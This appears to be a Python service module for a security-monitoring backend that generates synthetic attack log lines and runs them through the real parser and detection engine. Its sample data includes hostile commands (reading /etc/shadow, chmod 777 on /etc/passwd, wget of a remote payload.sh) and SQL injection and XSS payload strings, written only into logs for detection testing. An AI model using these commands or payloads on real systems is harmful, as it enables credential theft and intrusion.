"""
Attack Simulator service — a process-wide background task that generates
one realistic synthetic security event every SIMULATOR_INTERVAL_SECONDS
and feeds it through the exact same pipeline a real uploaded log goes
through:

    raw log line -> Log row -> ParserRegistry parser -> NormalizedLogEntry
    -> DetectionEngineService.evaluate_entry() -> Alert (if a rule matches)

Nothing about parsing, normalization, or detection is reimplemented here
— this module only generates the raw input and drives the existing
pipeline with it, so it's a genuine exercise of the real system rather
than a separate fake-data/fake-alert generator.

This is a SINGLETON, process-wide task: start()/stop() affect the whole
running backend, not a per-user or per-session simulation. It manages its
own DB session per tick (via AsyncSessionLocal) because it outlives any
single HTTP request's request-scoped session.
"""
from __future__ import annotations

import asyncio
import random
import uuid
from datetime import datetime, timezone
from typing import Callable, Optional

from app.db.session import AsyncSessionLocal
from app.models.log import LogSourceType, NormalizedLogEntry, ParseStatus
from app.parsers.base_parser import ParserRegistry
from app.repositories.log_repository import LogRepository
from app.services.detection_engine_service import DetectionEngineService
from app.services.file_storage_service import FileStorageService

SIMULATOR_INTERVAL_SECONDS = 2

_USERNAMES = ["admin", "root", "test", "oracle", "svc_backup", "jsmith", "mchen"]
_ATTACKER_IPS = ["203.0.113.5", "203.0.113.9", "198.51.100.23", "198.51.100.77"]
_SUDO_COMMANDS = [
    "/usr/bin/cat /etc/shadow",
    "/bin/chmod 777 /etc/passwd",
    "/usr/bin/wget http://198.51.100.90/payload.sh",
]
_SQLI_PAYLOADS = [
    "/product?id=1' OR '1'='1",
    "/product?id=1 UNION SELECT username,password FROM users--",
    "/login?user=admin'--",
]
_XSS_PAYLOADS = [
    "/search?q=<script>alert(1)</script>",
    "/comment?text=%3Cscript%3Edocument.cookie%3C/script%3E",
    "/profile?name=<img src=x onerror=alert(1)>",
]


def _generate_linux_ssh_failed() -> tuple[LogSourceType, str]:
    now = datetime.now(timezone.utc)
    user = random.choice(_USERNAMES)
    ip = random.choice(_ATTACKER_IPS)
    port = random.randint(30000, 60000)
    pid = random.randint(1000, 9999)
    line = (
        f"{now:%b} {now.day:2d} {now:%H:%M:%S} sim-host sshd[{pid}]: "
        f"Failed password for invalid user {user} from {ip} port {port} ssh2"
    )
    return LogSourceType.LINUX_AUTH, line


def _generate_linux_sudo_abuse() -> tuple[LogSourceType, str]:
    now = datetime.now(timezone.utc)
    user = random.choice(_USERNAMES)
    cmd = random.choice(_SUDO_COMMANDS)
    line = (
        f"{now:%b} {now.day:2d} {now:%H:%M:%S} sim-host sudo:    {user} : "
        f"TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"
    )
    return LogSourceType.LINUX_AUTH, line


def _generate_apache_sqli() -> tuple[LogSourceType, str]:
    now = datetime.now(timezone.utc)
    ip = random.choice(_ATTACKER_IPS)
    payload = random.choice(_SQLI_PAYLOADS)
    line = (
        f'{ip} - - [{now:%d/%b/%Y:%H:%M:%S} +0000] "GET {payload} HTTP/1.1" '
        f'500 {random.randint(200, 2000)} "-" "sqlmap/1.7"'
    )
    return LogSourceType.APACHE, line


def _generate_nginx_xss() -> tuple[LogSourceType, str]:
    now = datetime.now(timezone.utc)
    ip = random.choice(_ATTACKER_IPS)
    payload = random.choice(_XSS_PAYLOADS)
    line = (
        f'{ip} - - [{now:%d/%b/%Y:%H:%M:%S} +0000] "GET {payload} HTTP/1.1" '
        f'200 {random.randint(100, 600)} "-" "Mozilla/5.0"'
    )
    return LogSourceType.NGINX, line


_EVENT_GENERATORS: list[Callable[[], tuple[LogSourceType, str]]] = [
    _generate_linux_ssh_failed,
    _generate_linux_sudo_abuse,
    _generate_apache_sqli,
    _generate_nginx_xss,
]


class SimulatorService:
    def __init__(self) -> None:
        self._task: Optional[asyncio.Task] = None
        self._running = False
        self._started_at: Optional[datetime] = None
        self._events_generated = 0
        self._alerts_generated = 0
        self._last_event_at: Optional[datetime] = None
        self._last_error: Optional[str] = None
        self._storage = FileStorageService()

    @property
    def is_running(self) -> bool:
        return self._running

    def status(self) -> dict:
        return {
            "running": self._running,
            "started_at": self._started_at,
            "events_generated": self._events_generated,
            "alerts_generated": self._alerts_generated,
            "last_event_at": self._last_event_at,
            "last_error": self._last_error,
            "interval_seconds": SIMULATOR_INTERVAL_SECONDS,
        }

    def start(self) -> bool:
        """Returns True if it was started, False if it was already running."""
        if self._running:
            return False
        self._running = True
        self._started_at = datetime.now(timezone.utc)
        self._events_generated = 0
        self._alerts_generated = 0
        self._last_error = None
        self._task = asyncio.create_task(self._run_loop())
        return True

    async def stop(self) -> bool:
        """Returns True if it was stopped, False if it wasn't running."""
        if not self._running:
            return False
        self._running = False
        if self._task is not None:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
        return True

    async def _run_loop(self) -> None:
        try:
            while True:
                await asyncio.sleep(SIMULATOR_INTERVAL_SECONDS)
                try:
                    await self._generate_one_event()
                except Exception as exc:  # noqa: BLE001 - one bad tick must never kill the loop
                    self._last_error = str(exc)
        except asyncio.CancelledError:
            raise

    async def _generate_one_event(self) -> None:
        source_type, raw_line = random.choice(_EVENT_GENERATORS)()

        # Write the synthetic line to its own tiny file, namespaced under
        # the same upload storage root used for real uploads, so it goes
        # through the identical on-disk convention.
        dest_dir = self._storage.base_dir / "simulator"
        dest_dir.mkdir(parents=True, exist_ok=True)
        filename = f"{uuid.uuid4().hex}_{source_type.value}.log"
        dest_path = dest_dir / filename
        content = (raw_line + "\n").encode("utf-8")
        dest_path.write_bytes(content)
        relative_path = dest_path.relative_to(self._storage.base_dir).as_posix()

        alerts_created: list = []

        async with AsyncSessionLocal() as db:
            logs = LogRepository(db)
            log = await logs.create(
                source_type=source_type,
                original_filename=filename,
                file_reference=relative_path,
                file_size_bytes=len(content),
                uploaded_by_id=None,  # system-generated, not tied to any one user
            )

            # Reuse the real parser for this source type — same class the
            # Log Parser module uses for actual uploads.
            parser = ParserRegistry.get_parser(source_type)
            result = parser.parse(dest_path)

            if result.entries:
                parsed = result.entries[0]
                entry = NormalizedLogEntry(
                    log_id=log.id,
                    timestamp=parsed.timestamp,
                    event_id=parsed.event_id,
                    hostname=parsed.hostname,
                    username=parsed.username,
                    process_name=parsed.process_name,
                    source_ip=parsed.source_ip,
                    destination_ip=parsed.destination_ip,
                    command_line=parsed.command_line,
                    status=parsed.status,
                    severity=parsed.severity,
                    raw_fields=parsed.raw_fields,
                )
                db.add(entry)
                await db.flush()

                await logs.set_parse_status(
                    log, ParseStatus.COMPLETED, stats=result.stats.as_dict(), mark_parsed_now=True
                )

                # Reuse the real Detection Engine — same class real
                # uploaded/parsed entries are evaluated against. Alerts
                # are only created if a matching enabled rule actually
                # exists; an empty rule set correctly yields zero alerts.
                engine = DetectionEngineService(db)
                alerts_created = await engine.evaluate_entry(entry)
            else:
                await logs.set_parse_status(
                    log,
                    ParseStatus.FAILED,
                    stats={"error": "simulator-generated line failed to parse", **result.stats.as_dict()},
                    mark_parsed_now=True,
                )

            await db.commit()

        self._events_generated += 1
        self._alerts_generated += len(alerts_created)
        self._last_event_at = datetime.now(timezone.utc)


# Module-level singleton — one simulator per backend process.
simulator_service = SimulatorService()
